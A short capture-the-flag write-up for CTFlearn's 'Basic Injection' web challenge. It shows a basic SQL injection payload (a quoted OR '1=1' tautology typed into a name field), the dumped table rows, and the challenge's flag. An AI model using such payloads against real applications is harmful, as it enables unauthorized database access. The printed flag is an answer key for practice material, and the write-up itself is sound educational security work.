<h1> Basic Injection </h1>

Problem Statement: <br>
See if you can leak the whole database using what you know about SQL Injections. <br>

Step-1: <br>
After visiting the given URL <a>https://web.ctflearn.com/web4/</a>, you will be asked to input something and then submit it.

Step-2: <br>
Inspect the input text box. <br>
You will find the line given below. <br>
<code> Try some names like Hiroki, Noah, Luke </code>

Step-3: <br>
You will find no flag even after submitting the above names. Now try basic SQL payloads in the existing database. <br>
I submitted the input <code> Lucifer' OR ' 1 = 1 </code> and got the following output: <br>
<code>
Name: Luke \n
Data: I made this problem. \n
Name: Alec \n
Data: Steam boys. \n
Name: Jalen \n
Data: Pump that iron fool. \n
Name: Eric \n
Data: I make cars. \n
Name: Sam \n
Data: Thinks he knows SQL. \n
Name: fl4g__giv3r \n
Data: CTFlearn{th4t_is_why_you_n33d_to_sanitiz3_inputs} \n
Name: snoutpop \n
Data: jowls \n
Name: Chunbucket \n
Data: @datboiiii \n
</code>

Step-4: <br>
The desired flag <code>CTFlearn{th4t_is_why_you_n33d_to_sanitiz3_inputs}</code> can be found in line number 12 of the above output.
